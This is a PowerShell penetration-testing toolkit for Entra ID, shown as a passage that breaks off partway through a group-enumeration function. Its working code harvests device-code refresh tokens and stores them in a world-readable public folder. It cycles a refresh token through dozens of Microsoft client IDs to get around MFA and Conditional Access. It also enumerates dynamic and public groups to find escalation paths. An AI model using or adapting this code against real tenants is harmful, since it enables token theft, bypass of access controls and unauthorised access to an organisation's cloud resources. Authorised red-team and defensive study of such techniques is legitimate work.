<#
	Entra Colection => EntraCollection.ps1
 
        Author: Shaked Wiessman (ShkudW), offensive cyber security at Ab-inBev.com
        This PowerShell Scripts Collection build for Penetration Testing on Entra ID Cloud!
        I Hope this will help you in your operation
#>

function Get-Tokens {	
<#	
Getting Access Token and Refreshtoken for Graph API or ARM API.
The Refresh Token will save in C:\Users\Public\Refreshtoken.txt -> modify it, if you want :)
Get-Tokens -DomainName domain.local -Graph | -ARM
#>	
	param(
        [Parameter(Mandatory = $false)] [string]$DomainName,
        [Parameter(Mandatory = $false)] [switch]$Graph,
        [Parameter(Mandatory = $false)] [switch]$ARM		
	)
		
		
		if ($DomainName -and -not $Graph -and -not $ARM){
			Write-Host "[!] Please choose between Graph Token or ARM Token" -ForegroundColor DarkBlue
			Write-Host "    Usage: Get-Tokens -DomainName domain.com -Graph | -ARM" -ForegroundColor DarkBlue
			return
		}

		if (-not $DomainName -and -not $Graph -and -not $ARM){
			Write-Host "[!] Please provide -DomainName and select -Graph or -ARM" -ForegroundColor DarkBlue
			Write-Host "    Usage: Get-Tokens -DomainName domain.com -Graph | -ARM" -ForegroundColor DarkBlue
			return
		}
				
		if ($Graph -and $ARM) {
			Write-Host "[!] Please select only one API: either -Graph or -ARM, not both." -ForegroundColor DarkBlue
			return
		}


		function Get-DomainName {
			try {
				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
				$TenantID = ($response.issuer -split "/")[3]
				Write-Host "[*] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
                Write-Host "[+] Using this Tenant ID for actions" -ForegroundColor DarkYellow
				return $TenantID
			} catch {
				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
				return $null
			}
		}

        if($DomainName){$TenantID = Get-DomainName }
			
		$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
		
		$deviceCodeUrl = "https://login.microsoftonline.com/common/oauth2/devicecode"
		$headers = @{ 'User-Agent' = $UserAgent }
        $Body = @{
            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "Resource"     = "https://graph.microsoft.com"
         }

		$authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Headers $headers -Body $Body
		$code = $authResponse.user_code
		$deviceCode = $authResponse.device_code
		Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkCyan -NoNewline
		Write-Host " $code" -ForegroundColor DarkYellow
		Start-Sleep -Seconds 5
		Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"

		$tokenUrl = "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0"
		$tokenBody = @{
			"scope"      = "openid"
			"client_id"  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
			"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
			"code"       = $deviceCode
		}

		while ($true) {
			try { 
				$tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Headers $headers -Body $tokenBody -ErrorAction Stop -ContentType "application/x-www-form-urlencoded"
				$RefreshToken = $tokenResponse.refresh_token
				Set-Content -Path "C:\Users\Public\Refreshtoken.txt" -Value $RefreshToken
				Write-Host "`n[+] Refresh Token saved to C:\Users\Public\Refreshtoken.txt" -ForegroundColor DarkYellow
                Write-Host " " 
                if($Graph) {Write-Host "[>] Requesting Access Token For Microsoft Graph API with Refresh Token" -ForegroundColor DarkCyan}
                if($ARM)   {Write-Host "[>] Requesting Access Token For Azure Resource Management API with Refresh Token" -ForegroundColor DarkCyan}
                Write-Host " " 
				$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token?api-version=1.0"

                if($Graph) {
					$refreshBody = @{
						"client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
						"scope"         = "https://graph.microsoft.com/.default"
						"grant_type"    = "refresh_token"
						"refresh_token" = $RefreshToken
					}
                }

                if($ARM) {
					$refreshBody = @{
						"client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
						"scope"         = "https://management.azure.com/.default"
						"grant_type"    = "refresh_token"
						"refresh_token" = $RefreshToken
					}
                }
						
                try {
					$refreshResponse = Invoke-RestMethod -Method POST -Uri $url -Body $refreshBody -ContentType "application/x-www-form-urlencoded"
					$AccessToken = $refreshResponse.access_token
                    if($Graph) {Write-Host "[+] Access Token for Microsoft Graph API retrieved:" -ForegroundColor DarkGreen}
                    if($ARM) {Write-Host "[+] Access Token for Azure Resource Management API retrieved:" -ForegroundColor DarkGreen}
                    return Write-Host "$AccessToken" -ForegroundColor DarkYellow
					} catch {
						    Write-Host "`n[-] Failed to retrieve Access Token using Refresh Token." -ForegroundColor Red
							return $null
						}
					} catch {
						    $errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
						    if ($errorResponse.error -eq "authorization_pending") {
							    Start-Sleep -Seconds 5
						    } elseif ($errorResponse.error -eq "authorization_declined" -or $errorResponse.error -eq "expired_token") {
							    Write-Host "`n[-] Authorization failed or expired." -ForegroundColor Red
							return
						    } else {
							    Write-Host "`n[-] Unexpected error: $($errorResponse.error)" -ForegroundColor Red
							return
						}
					}
				}

}


<###############################################################################################################################################>


function Check-MFABypass {
	
		<#
		
		Trying to getting Access Token for ARM API with defferent client ids.
		Check-MFABypass -DomainName domain.local -RefreshToken 
		
		#>	
	
    param (
        [Parameter(Mandatory = $true)]
		[string]$DomainName,
        [Parameter(Mandatory = $true)]
		[string]$RefreshToken
    )

    $ClientIDs = @{
        "00b41c95-dab0-4487-9791-b9d2c32c80f2" = "Office 365 Management"
        "04b07795-8ddb-461a-bbee-02f9e1bf7b46" = "Microsoft Azure CLI"
        "0ec893e0-5785-4de6-99da-4ed124e5296c" = "Office UWP PWA"
        "18fbca16-2224-45f6-85b0-f7bf2b39b3f3" = "Microsoft Docs"
        "1950a258-227b-4e31-a9cf-717495945fc2" = "Microsoft Azure PowerShell"
        "1b3c667f-cde3-4090-b60b-3d2abd0117f0" = "Windows Spotlight"
        "1b730954-1685-4b74-9bfd-dac224a7b894" = "Azure Active Directory PowerShell"
        "1fec8e78-bce4-4aaf-ab1b-5451cc387264" = "Microsoft Teams"
        "22098786-6e16-43cc-a27d-191a01a1e3b5" = "Microsoft To-Do client"
        "268761a2-03f3-40df-8a8b-c3db24145b6b" = "Universal Store Native Client"
        "26a7ee05-5602-4d76-a7ba-eae8b7b67941" = "Windows Search"
        "27922004-5251-4030-b22d-91ecd9a37ea4" = "Outlook Mobile"
        "29d9ed98-a469-4536-ade2-f981bc1d605e" = "Microsoft Authentication Broker"
        "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8" = "Microsoft Bing Search for Microsoft Edge"
        "4813382a-8fa7-425e-ab75-3b753aab3abb" = "Microsoft Authenticator App"
        "4e291c71-d680-4d0e-9640-0a3358e31177" = "PowerApps"
        "57336123-6e14-4acc-8dcf-287b6088aa28" = "Microsoft Whiteboard Client"
        "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0" = "Microsoft Flow Mobile PROD-GCCH-CN"
        "60c8bde5-3167-4f92-8fdb-059f6176dc0f" = "Enterprise Roaming and Backup"
        "66375f6b-983f-4c2c-9701-d680650f588f" = "Microsoft Planner"
        "844cca35-0656-46ce-b636-13f48b0eecbd" = "Microsoft Stream Mobile Native"
        "872cd9fa-d31f-45e0-9eab-6e460a02d1f1" = "Visual Studio - Legacy"
        "87749df4-7ccf-48f8-aa87-704bad0e0e16" = "Microsoft Teams - Device Admin Agent"
        "90f610bf-206d-4950-b61d-37fa6fd1b224" = "Aadrm Admin PowerShell"
        "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223" = "Microsfot Intune Company Portal"
        "9bc3ab49-b65d-410a-85ad-de819febfddc" = "Microsoft SharePoint Online Management Shell"
        "a0c73c16-a7e3-4564-9a95-2bdf47383716" = "Microsoft Exchange Online Remote PowerShell"
        "a40d7d7d-59aa-447e-a655-679a4107e548" = "Accounts Control UI"
        "a569458c-7f2b-45cb-bab9-b7dee514d112" = "Yammer iPhone"
        "ab9b8c07-8f02-4f72-87fa-80105867a763" = "OneDrive Sync Engine"
        "af124e86-4e96-495a-b70a-90f90ab96707" = "OneDrive iOS App"
        "b26aadf8-566f-4478-926f-589f601d9c74" = "OneDrive"
        "b90d5b8f-5503-4153-b545-b31cecfaece2" = "AADJ CSP"
        "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12" = "Microsoft Power BI"
        "c58637bb-e2e1-4312-8a00-04b5ffcd3403" = "SharePoint Online Client Extensibility"
        "cb1056e2-e479-49de-ae31-7812af012ed8" = "Microsoft Azure Active Directory Connect"
        "cf36b471-5b44-428c-9ce7-313bf84528de" = "Microsoft Bing Search"
        "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" = "SharePoint"
        "d3590ed6-52b3-4102-aeff-aad2292ab01c" = "Microsoft Office"
        "e9b154d0-7658-433b-bb25-6b8e0a8a7c59" = "Outlook Lite"
        "e9c51622-460d-4d3d-952d-966a5b1da34c" = "Microsoft Edge"
        "eb539595-3fe1-474e-9c1d-feb3625d1be5" = "Microsoft Tunnel"
        "ecd6b820-32c2-49b6-98a6-444530e5a77a" = "Microsoft Edge"
        "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d" = "SharePoint Android"
        "f448d7e5-e313-4f90-a3eb-5dbb3277e4b3" = "Media Recording for Dynamics 365 Sales"
        "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34" = "Microsoft Edge"
        "fb78d390-0c51-40cd-8e17-fdbfab77341b" = "Microsoft Exchange REST API Based PowerShell"
        "fc0f3af4-6835-4174-b806-f7db311fd2f3" = "Microsoft Intune Windows Agent"
    }
		
		function Get-DomainName {
			try {
				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
				$TenantID = ($response.issuer -split "/")[3]
				Write-Host "[>] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
				return $TenantID
			} catch {
				    Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
					return $null
				}
		}

        if($DomainName)	{$TenantID = Get-DomainName}
		
        foreach ($ClientID in $ClientIDs.Keys) {
                Write-Host "`n[*] Trying Client ID: $ClientID ($($ClientIDs[$ClientID]))..." -ForegroundColor DarkCyan
                $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
                $body = @{
                    "client_id"     = $ClientID
                    "scope"         = "https://management.azure.com/.default"
                    "grant_type"   = "refresh_token"
                    "refresh_token" = $RefreshToken
                }

            try {
                $response = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
                $AccessToken = $response.access_token
                if ($AccessToken) {
                    Write-Host "[SUCCESS] Access Token for ARM API with Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkGreen
                    Write-Host "Access Token: $AccessToken" -ForegroundColor DarkYellow
                } else {
                    Write-Host "[-] No access token received for Client ID: $ClientID" -ForegroundColor DarkYellow
                }

             } catch {
                $errorMessage = $_.ErrorDetails.Message | ConvertFrom-Json
                if ($errorMessage.error_description -match "AADSTS53003") {
                    Write-Host "[!] Blocked by Conditional Access - Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkRed
                }
                elseif ($errorMessage.error_description -match "AADSTS70000") {
                    Write-Host "[!] Invalid or Malformed Grant - Refresh token likely not valid for Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkGray
                    Write-Host "[>] Device Code Flow with Client ID: $ClientID for trying to bypass continental access" -ForegroundColor DarkCyan
                    $deviceCodeUrl = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/devicecode"
                    $deviceBody = @{
                    client_id = $ClientID
                    scope     = "offline_access https://management.azure.com/.default"
                    #"Resource"     = "https://management.azure.com"
                    }

                    try {
                        $deviceResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Body $deviceBody
                        Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkCyan -NoNewline
                        Write-Host " $($deviceResponse.user_code)" -ForegroundColor DarkYellow
                        Start-Process $deviceResponse.verification_uri

                        $userInput = Read-Host "[...] Press Enter to continue polling, or type 'skip' to skip this client"
                        if ($userInput -eq "skip") {
                            Write-Host "[>] Skipping Client ID: $ClientID" -ForegroundColor Gray
                        continue
                        }

                    $pollBody = @{
                        grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
                        client_id   = $ClientID
                        device_code = $deviceResponse.device_code
                    }

                    while ($true) {
                        try {
                            $pollResponse = Invoke-RestMethod -Method POST -Uri $url -Body $pollBody -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
                           $AccessToken = $pollResponse.access_token
                            Write-Host "[SUCCESS] New Access Token granted with Client ID: $ClientID" -ForegroundColor DarkGreen
                            Write-Host "Access Token: $AccessToken" -ForegroundColor DarkYellow
                            break
                        } catch {
                            $inner = $_.ErrorDetails.Message | ConvertFrom-Json
                            if ($inner.error -eq "authorization_pending") {
                                Start-Sleep -Seconds 5
                            } elseif ($inner.error -eq "authorization_declined" -or $inner.error -eq "expired_token") {
                                Write-Host "[-] Authorization failed or expired for Client ID: $ClientID" -ForegroundColor Red
                                break
                            } else {
                                Write-Host "[-] Polling error: $($inner.error_description)" -ForegroundColor Red
                                break
                            }
                        }
                    }

                } catch {
                    Write-Host "[-] Device Code flow failed for Client ID: $ClientID - $($_.Exception.Message)" -ForegroundColor Red
                }

            } else {
                Write-Host "[-] Unhandled error for Client ID: $ClientID - $($errorMessage.error_description)" -ForegroundColor Red
            }
        }

        Start-Sleep -Milliseconds 500
    }
}


<###############################################################################################################################################>


function Invoke-FindDynamicGroups {
		
		<#
		
		Trying to getting Access Token for ARM API with defferent client ids.
		Invoke-FindDynamicGroups -DomainName shakudw.local -RefreshToken 
		Invoke-FindDynamicGroups -DomainName shakudw.local -DeviceCodeFlow 
		Invoke-FindDynamicGroups -DomainName shakudw.local -ClientId -ClientSecret
		
		#>
	
	
	param (
        [Parameter(Mandatory = $false)] [string]$RefreshToken,
        [Parameter(Mandatory = $false)] [switch]$DeviceCodeFlow,
		[Parameter(Mandatory = $false)] [string]$ClientID,
		[Parameter(Mandatory = $false)] [string]$DomainName,
		[Parameter(Mandatory = $false)] [string]$ClientSecret
    )

		function Example {
			Write-Host "Invoke-FindDynamicGroups:" -ForegroundColor DarkYellow
			Write-Host " Invoke-FindDynamicGroups -DeviceCodeFlow -DomainName <domain.local>" -ForegroundColor DarkCyan
			Write-Host " Invoke-FindDynamicGroups -RefreshToken <Refresh_Token> -DomainName <domain.local>" -ForegroundColor DarkCyan
			Write-Host " Invoke-FindDynamicGroups -ClientId <Application_ClientID> -ClientSecret <Application_SecretID> -DomainName <domain.local>" -ForegroundColor DarkCyan
		}

		if (-not $RefreshToken -and -not $ClientId -and -not $ClientSecret -and -not $DeviceCodeFlow -and -not $DomainName ) {
			Example
			return
		}
	
		function Get-DomainName {
			try {
				$response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
				$TenantID = ($response.issuer -split "/")[3]
				Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
				return $TenantID
			} catch {
				Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
				return $null
			}
		}

        if($DomainName){$TenantID = Get-DomainName}
		
		function Get-DeviceCodeToken {
			$deviceCodeUrl = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
            $UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
			$headers = @{ 'User-Agent' = $UserAgent }
			$body = @{
				"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
				"Resource"     = "https://graph.microsoft.com"
			}

			$authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Headers $headers -Body $body
			$code = $authResponse.user_code
			$deviceCode = $authResponse.device_code
		    Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkCyan -NoNewline
			Write-Host " $code" -ForegroundColor DarkYellow
			Start-Sleep -Seconds 5
			Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"

			$tokenUrl = "https://login.microsoftonline.com/$TenantID/oauth2/token?api-version=1.0"
			$tokenBody = @{
				"scope"      = "openid"
				"client_id"  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
				"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
				"code"       = $deviceCode
			}

			while ($true) {
				try {
					$tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Headers $headers -Body $tokenBody -ErrorAction Stop
					return $tokenResponse.refresh_token
				} catch {
					$errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
					if ($errorResponse.error -eq "authorization_pending") {
						Start-Sleep -Seconds 5
					} elseif ($errorResponse.error -eq "authorization_declined" -or $errorResponse.error -eq "expired_token") {
						return $null
					} else {
						return $null
					}
				}
			}
		}

		function Get-Token-WithRefreshToken {
            param(
                [Parameter(Mandatory = $false)] [string]$RefreshToken
            )

			    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			    $body = @{
                    "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                    "scope"         = "https://graph.microsoft.com/.default"
                    "grant_type"    = "refresh_token"
                    "refresh_token" = $RefreshToken
			    }
			    return (Invoke-RestMethod -Method POST -Uri $url -Body $body).access_token
		}

		function Get-Token-WithClientSecret {
            param(
                [Parameter(Mandatory = $false)] [string]$ClientID,
                [Parameter(Mandatory = $false)] [string]$ClientSecret
                
            )
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			$body = @{
				"client_id"     = $ClientId
				"client_secret" = $ClientSecret
				"scope"         = "https://graph.microsoft.com/.default"
				"grant_type"    = "client_credentials"
			}
			return (Invoke-RestMethod -Method POST -Uri $url -Body $body).access_token
		}

		$authMethod = ""
			if ($RefreshToken) {
				$authMethod = "refresh"
				$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
			} elseif ($ClientId -and $ClientSecret) {
				$authMethod = "client"
				$GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -ClientSecret $ClientSecret
			} elseif ($DeviceCodeFlow) {
				$authMethod = "refresh"
				if (Test-Path "C:\Users\Public\RefreshToken.txt"){
					Remove-Item -Path "C:\Users\Public\RefreshToken.txt" -Force}
					$RefreshToken = Get-DeviceCodeToken
					Add-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $RefreshToken
					Write-Host "[SAVE] refresh token writen to C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
					$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
			}

		if (-not $GraphAccessToken) { return }

		if (Test-Path "Dynamic_Groups.txt") {
			$choice = Read-Host "Dynamic_Groups.txt exists. (D)elete / (A)ppend?"
			if ($choice -match "^[dD]$") {
				Remove-Item -Path "Dynamic_Groups.txt" -Force
			} elseif ($choice -notmatch "^[aA]$") {
			return
			}
		}

		$headers = @{
			"Authorization"    = "Bearer $GraphAccessToken"
			"Content-Type"     = "application/json"
			"ConsistencyLevel" = "eventual"
			"Prefer"           = "odata.maxpagesize=999"
		}

		$startTime = Get-Date
		$refreshIntervalMinutes = 7
		$groupApiUrl = "https://graph.microsoft.com/v1.0/groups?$filter=groupTypes/any(c:c eq 'Unified')&$select=id,displayName,membershipRule&$top=999"

		$totalGroupsScanned = 0

		Write-Host "`n[*] Fetching Dynamic Groups..." -ForegroundColor DarkCyan

    do {
        $success = $false
        do {
            try {
                $response = Invoke-RestMethod -Uri $groupApiUrl -Headers $headers -Method Get -ErrorAction Stop
                $success = $true
            } catch {
                $statusCode = $_.Exception.Response.StatusCode.value__
                if ($statusCode -eq 429) {
                    $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                    if (-not $retryAfter) { $retryAfter = 7 }
                    Write-Host "[!] Rate limit hit. Sleeping for $retryAfter seconds..." -ForegroundColor DarkYellow
                    Start-Sleep -Seconds ([int]$retryAfter)
                } elseif ($statusCode -eq 401) {
                    Write-Host "[!] Access token expired, refreshing..." -ForegroundColor DarkYellow
                    if ($authMethod -eq "refresh") {
                        $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
                    } elseif ($authMethod -eq "client") {
                        $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -SecretId $SecretId
                    }
                    if (-not $GraphAccessToken) { return }
                    $headers["Authorization"] = "Bearer $GraphAccessToken"
                    $startTime = Get-Date
                } else {
                    Write-Host "[-] Unexpected error. Exiting." -ForegroundColor Red
                    return
                }
            }
        } while (-not $success)

        $groupsBatch = $response.value
        $batchCount = $groupsBatch.Count
        $scannedInBatch = 0

			foreach ($group in $groupsBatch) {
				$groupId = $group.id
				$groupName = $group.displayName
				$membershipRule = $group.membershipRule

				if ($membershipRule -ne $null) {
				
					Write-Host "[+] $groupName ($groupId) is Dynamic" -ForegroundColor DarkGreen

					$conditions = @()
					if ($membershipRule -match '\buser\.mail\b') { $conditions += "mail" }
					if ($membershipRule -match '\buser\.userPrincipalName\b') { $conditions += "userPrincipalName" }
					if ($membershipRule -match '\buser\.displayName\b') { $conditions += "displayName" }

					if ($conditions.Count -gt 0) {						
						  if ($membershipRule -match "@") {
							continue  
						}
						$joined = ($conditions -join " AND ")
						Write-Host "    [!] Contains sensitive rule: $joined" -ForegroundColor Yellow
						Write-Host "      [$groupName] => $membershipRule" -ForegroundColor DarkCyan
						$outputLine = "      [Sensitive Rule] $($groupName.PadRight(30)) : $($groupId.PadRight(40)) : $joined : $membershipRule"
					} else {

					}
					
			        try {
						Add-Content -Path "Dynamic_Groups.txt" -Value $outputLine
					} catch {
						Write-Host "[!] Failed to write to file: $_" -ForegroundColor Red
					}
				}

				$scannedInBatch++
				$totalGroupsScanned++
				$percent = [math]::Round(($scannedInBatch / $batchCount) * 100)
				Write-Progress -Activity "Scanning Dynamic Groups..." -Status "$percent% Complete in current batch" -PercentComplete $percent
			}

        if ((New-TimeSpan -Start $startTime).TotalMinutes -ge $refreshIntervalMinutes) {
            Write-Host "[*] Refresh interval reached, refreshing token..." -ForegroundColor DarkYellow
            if ($authMethod -eq "refresh") {
                $GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
            } elseif ($authMethod -eq "client") {
                $GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -ClientSecret $ClientSecret
            }
            if (-not $GraphAccessToken) { return }
            $headers["Authorization"] = "Bearer $GraphAccessToken"
            $startTime = Get-Date
        }

        $groupApiUrl = $response.'@odata.nextLink'

    } while ($groupApiUrl)

    Write-Host "`n[*] Finished scanning. Total Groups Scanned: $totalGroupsScanned" -ForegroundColor DarkCyan
}


<###############################################################################################################################################>


function Invoke-FindPublicGroups {

		<#

		Invoke-FindPublicGroup -DomainName shakudw.local -RefreshToken -DomainName <domain.local>
		Invoke-FindPublicGroup -DomainName shakudw.local -DeviceCodeFlow -DomainName <domain.local>
		Invoke-FindPublicGroup -DomainName shakudw.local -ClientId -ClientSecret -DomainName <domain.local>		
		#>

    param (
        [Parameter(Mandatory = $false)] [string]$RefreshToken,
        [Parameter(Mandatory = $false)] [switch]$DeviceCodeFlow,
        [Parameter(Mandatory = $false)] [string]$ClientId,
        [Parameter(Mandatory = $false)] [string]$DomainName,
        [Parameter(Mandatory = $false)] [string]$SecretId,
        [Parameter(Mandatory = $false)] [switch]$Deep		
    )
	
        function Get-DomainName {
            param (
                [Parameter(Mandatory = $true)] [string]$DomainName
            )
                try {
                    $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
                    $TenantID = ($response.issuer -split "/")[3]
                    Write-Host "[*] Tenant ID for $DomainName is $TenantID" -ForegroundColor DarkCyan
                    return $TenantID
                } catch {
                    Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
                return $null
                }
        }   
	
        function Example {
                Write-Host "Invoke-FindPublicGroups:" -ForegroundColor DarkYellow
                Write-Host "------------" -ForegroundColor DarkYellow
                Write-Host "Invoke-FindPublicGroups -DeviceCodeFlow -DomainName <domain.local>" -ForegroundColor DarkCyan
                Write-Host "Invoke-FindPublicGroups -RefreshToken <Refresh_Token> -DomainName <domain.local>" -ForegroundColor DarkCyan
                Write-Host "Invoke-FindPublicGroups -ClientId <Application_ClientID> -SecretId <Application_SecretID> -DomainName <domain.local>" -ForegroundColor DarkCyan
        }

        if (-not $RefreshToken -and -not $ClientId -and -not $SecretId -and -not $DeviceCodeFlow -and -not $Deap -and -not $DomainName) {
            Example
            return
        }

    

        function Get-DeviceCodeToken {
                $deviceCodeUrl = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
                $UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
                $headers = @{ 'User-Agent' = $UserAgent }
                $body = @{
                    "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                    "Resource"     = "https://graph.microsoft.com"
                }

                $authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Headers $headers -Body $body
                $code = $authResponse.user_code
                $deviceCode = $authResponse.device_code
                Write-Host "`n[>] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkCyan -NoNewline
                Write-Host " $code" -ForegroundColor DarkYellow
                Start-Sleep -Seconds 5
                Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"

                $tokenUrl = "https://login.microsoftonline.com/$TenantID/oauth2/token?api-version=1.0"
                $tokenBody = @{
                    "scope"      = "openid"
                    "client_id"  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                    "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
                    "code"       = $deviceCode
                }

                while ($true) {
                    try {
                        $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Headers $headers -Body $tokenBody -ErrorAction Stop
                        return $tokenResponse.refresh_token
                    } catch {
                        $errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
                        if ($errorResponse.error -eq "authorization_pending") {
                            Start-Sleep -Seconds 5
                        } elseif ($errorResponse.error -eq "authorization_declined" -or $errorResponse.error -eq "expired_token") {
                            return $null
                        } else {
                            return $null
                        }
                    }
                }
        }

   
       	if (-not $TenantID -and $DomainName) {
            $TenantID = Get-DomainName -DomainName $DomainName
            if (-not $TenantID) {
                 Write-Error "[-] Cannot continue without Tenant ID."
                return
            }
        }

		function Get-Token-WithRefreshToken {
            param(
                [Parameter(Mandatory = $false)] [string]$RefreshToken
            )

			    $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			    $body = @{
                    "client_id"     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
                    "scope"         = "https://graph.microsoft.com/.default"
                    "grant_type"    = "refresh_token"
                    "refresh_token" = $RefreshToken
			    }
			    return (Invoke-RestMethod -Method POST -Uri $url -Body $body).access_token
		}

		function Get-Token-WithClientSecret {
            param(
                [Parameter(Mandatory = $false)] [string]$ClientID,
                [Parameter(Mandatory = $false)] [string]$ClientSecret
                
            )
			$url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
			$body = @{
				"client_id"     = $ClientId
				"client_secret" = $ClientSecret
				"scope"         = "https://graph.microsoft.com/.default"
				"grant_type"    = "client_credentials"
			}
			return (Invoke-RestMethod -Method POST -Uri $url -Body $body).access_token
		}

    
		$authMethod = ""
			if ($RefreshToken) {
				$authMethod = "refresh"
				$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
			} elseif ($ClientId -and $ClientSecret) {
				$authMethod = "client"
				$GraphAccessToken = Get-Token-WithClientSecret -ClientId $ClientId -ClientSecret $ClientSecret
			} elseif ($DeviceCodeFlow) {
				$authMethod = "refresh"
				if (Test-Path "C:\Users\Public\RefreshToken.txt"){
					Remove-Item -Path "C:\Users\Public\RefreshToken.txt" -Force}
					$RefreshToken = Get-DeviceCodeToken
					Add-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $RefreshToken
					Write-Host "[SAVE] refresh token writen to C:\Users\Public\RefreshToken.txt " -ForegroundColor DarkYellow
					$GraphAccessToken = Get-Token-WithRefreshToken -RefreshToken $RefreshToken
			}


	    if (-not $GraphAccessToken) { return }

            if (Test-Path "Public_Groups.txt") {
                $choice = Read-Host "Public_Groups.txt exists. (D)elete / (A)ppend?"
                if ($choice -match "^[dD]$") {
                    Remove-Item -Path "Public_Groups.txt" -Force
                } elseif ($choice -notmatch "^[aA]$") {
                    return
                }
            }


    	 function Invoke-With-Retry {
            param (
                [string]$Url,
                [hashtable]$Headers
            )
            $success = $false
            $response = $null
            do {
                try {
                    $response = Invoke-RestMethod -Uri $Url -Headers $Headers -ErrorAction Stop
                    $success = $true
                } catch {
                    $statusCode = $_.Exception.Response.StatusCode.value__
                    if ($statusCode -eq 429) {
                        $retryAfter = $_.Exception.Response.Headers["Retry-After"]
                        if (-not $retryAfter) { $retryAfter = 7 }
                        Write-Host "[!] Rate limit hit ($Url). Sleeping $retryAfter seconds..." -ForegroundColor Yellow
                        Start-Sleep -Seconds ([int]$retryAfter)
                    } else {
                        Write-Host "[-] Error in request to $Url" -ForegroundColor DarkGray
                        return $null
                    }
                }
            } while (-not $success)
            return $response
        }

	
